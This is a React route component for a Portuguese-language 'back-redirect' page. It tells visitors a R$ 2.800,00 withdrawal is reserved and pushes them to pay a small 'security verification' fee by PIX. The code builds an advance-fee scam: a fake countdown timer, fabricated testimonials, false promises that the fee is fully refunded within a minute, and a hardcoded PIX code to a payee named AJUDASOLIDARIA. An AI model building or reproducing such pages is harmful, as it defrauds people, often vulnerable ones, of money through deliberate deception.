import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import { Clock, AlertTriangle, ShieldCheck, Copy, Loader2 } from "lucide-react";
import luiza from "@/assets/br-luiza.webp";
import amanda from "@/assets/br-amanda.webp";

export const Route = createFileRoute("/back-redirect")({
  component: BackRedirect,
});

const SAQUE = "R$ 2.800,00";
const DE = "R$ 23,39";
const POR = "R$ 11,90";
const ECONOMIA = "R$ 11,49";
const PIX_CODE =
  "00020101021226820014br.gov.bcb.pix2560qrcode.a55scd.com.br/v1/1df8a1d8-9ef3-4067-a726-caf0ffd61a6c5204000053039865802BR5914AJUDASOLIDARIA6008SAOPAULO62070503***6304B288";

function fmt(s: number) {
  const m = Math.floor(s / 60).toString().padStart(2, "0");
  const ss = (s % 60).toString().padStart(2, "0");
  return `${m}:${ss}`;
}

function BackRedirect() {
  const [secs, setSecs] = useState(5 * 60 + 41);
  const [showPix, setShowPix] = useState(false);
  const [pixSecs, setPixSecs] = useState(10 * 60);
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    const id = setInterval(() => setSecs((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, []);

  useEffect(() => {
    if (!showPix) return;
    const id = setInterval(() => setPixSecs((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, [showPix]);

  const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&margin=0&data=${encodeURIComponent(PIX_CODE)}`;

  const copy = () => {
    navigator.clipboard.writeText(PIX_CODE);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Top urgency bar */}
      <div className="bg-[#FF3B6C] text-white text-center py-2.5 px-4 flex items-center justify-center gap-2 sticky top-0 z-40 shadow">
        <Clock className="w-4 h-4" />
        <span className="text-[13px] font-bold">Oferta expira em</span>
        <span className="text-[15px] font-black tabular-nums">{fmt(secs)}</span>
      </div>

      <div className="max-w-md mx-auto px-4 pt-5 pb-10 space-y-5">
        {/* Headline */}
        <div className="text-center space-y-2">
          <h1 className="text-[26px] font-black text-foreground leading-tight">
            Espere um pouco!
          </h1>
          <p className="text-[15px] text-muted-foreground">
            Seu saque de <span className="font-bold text-foreground">{SAQUE}</span> ainda está reservado
          </p>
        </div>

        {/* Warning card */}
        <div className="rounded-2xl border-2 border-[#FF3B6C]/30 bg-[#FF3B6C]/5 p-4 flex gap-3">
          <div className="shrink-0 w-10 h-10 rounded-full bg-[#FF3B6C] flex items-center justify-center">
            <AlertTriangle className="w-5 h-5 text-white" />
          </div>
          <div className="flex-1">
            <p className="text-[14px] font-bold text-foreground">
              Você está prestes a perder {SAQUE}
            </p>
            <p className="text-[12px] text-muted-foreground mt-1">
              A verificação de segurança é a <span className="font-semibold text-foreground">última etapa</span> para liberar seu saque.
            </p>
          </div>
        </div>

        {/* Discount card */}
        <div className="rounded-2xl bg-gradient-to-br from-emerald-50 to-white border-2 border-emerald-500 p-5 shadow-lg">
          <div className="inline-flex items-center gap-1.5 bg-emerald-500 text-white text-[11px] font-black px-2.5 py-1 rounded-full mb-3">
            <ShieldCheck className="w-3 h-3" />
            DESCONTO EXCLUSIVO APLICADO
          </div>
          <div className="flex items-end gap-3">
            <div>
              <div className="text-[11px] text-muted-foreground">De</div>
              <div className="text-[16px] text-muted-foreground line-through">{DE}</div>
            </div>
            <div>
              <div className="text-[11px] text-muted-foreground">por apenas:</div>
              <div className="text-[32px] font-black text-emerald-600 leading-none">{POR}</div>
            </div>
          </div>
          <p className="text-[12px] text-emerald-700 font-semibold mt-2">
            Economia de {ECONOMIA} — 100% reembolsável
          </p>
        </div>

        {/* Testimonials */}
        <div className="space-y-3">
          {[
            {
              img: luiza,
              name: "Luiza Aragão",
              where: "Recife, PE",
              text: "gente eu tava quase desistindo kkk mas paguei a taxinha e caiu na hora 🥹💸",
              when: "há 12 min",
            },
            {
              img: amanda,
              name: "Amanda Lara",
              where: "Belo Horizonte, MG",
              text: "não acreditei até cair no pix kkkkk é real demais 🔥",
              when: "há 27 min",
            },
          ].map((t) => (
            <div key={t.name} className="rounded-xl border border-border bg-card p-3 flex gap-3">
              <img src={t.img} alt={t.name} className="w-9 h-9 rounded-full object-cover shrink-0" />
              <div className="flex-1 min-w-0">
                <div className="flex items-center gap-1.5 flex-wrap">
                  <span className="text-[13px] font-semibold text-foreground">{t.name}</span>
                  <span className="text-[10px] text-muted-foreground">• {t.where}</span>
                </div>
                <p className="text-[12px] italic text-foreground leading-snug mt-0.5">"{t.text}"</p>
                <p className="text-[10px] text-muted-foreground mt-0.5">{t.when}</p>
              </div>
            </div>
          ))}
        </div>

        {/* CTA */}
        <div>
          <button
            onClick={() => setShowPix(true)}
            className="w-full h-[60px] bg-[#FF3B6C] text-white font-black text-[16px] rounded-2xl flex items-center justify-center gap-2 active:scale-[0.97] transition-all shadow-[0_6px_20px_rgba(255,59,108,0.35)]"
          >
            LIBERAR MEU SAQUE DE {SAQUE}
          </button>
          <div className="flex items-center justify-center gap-1.5 mt-3">
            <Clock className="w-3.5 h-3.5 text-emerald-500" />
            <span className="text-[13px] font-semibold text-emerald-600">
              Reembolso de {POR} em 1 minuto
            </span>
          </div>
        </div>
      </div>

      {/* PIX Modal */}
      {showPix && (
        <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex items-end sm:items-center justify-center p-4">
          <div className="bg-white rounded-3xl w-full max-w-sm p-6 space-y-4 animate-in slide-in-from-bottom">
            <div className="text-center">
              <h2 className="text-[18px] font-black text-foreground">Pague com PIX</h2>
              <p className="text-[12px] text-muted-foreground mt-1">
                Escaneie o QR Code ou copie o código abaixo
              </p>
            </div>
            <div className="flex justify-center">
              <img src={qrUrl} alt="QR Code PIX" className="w-[220px] h-[220px] rounded-xl border border-border" />
            </div>
            <div className="border border-dashed border-border rounded-xl p-2.5 text-[10px] text-muted-foreground break-all font-mono leading-relaxed max-h-20 overflow-hidden">
              {PIX_CODE}
            </div>
            <button
              onClick={copy}
              className="w-full h-[52px] bg-emerald-500 text-white font-bold text-[15px] rounded-xl flex items-center justify-center gap-2 active:scale-[0.97]"
            >
              <Copy className="w-4 h-4" />
              {copied ? "Código copiado!" : "Copiar código PIX"}
            </button>
            <div className="text-center text-[12px] text-muted-foreground">
              Expira em <span className="font-bold text-foreground tabular-nums">{fmt(pixSecs)}</span>
            </div>
            <div className="flex items-center justify-center gap-2 text-[12px] text-muted-foreground">
              <Loader2 className="w-3.5 h-3.5 animate-spin" />
              Aguardando confirmação...
            </div>
            <button
              onClick={() => setShowPix(false)}
              className="w-full text-[12px] text-muted-foreground py-2"
            >
              Fechar
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
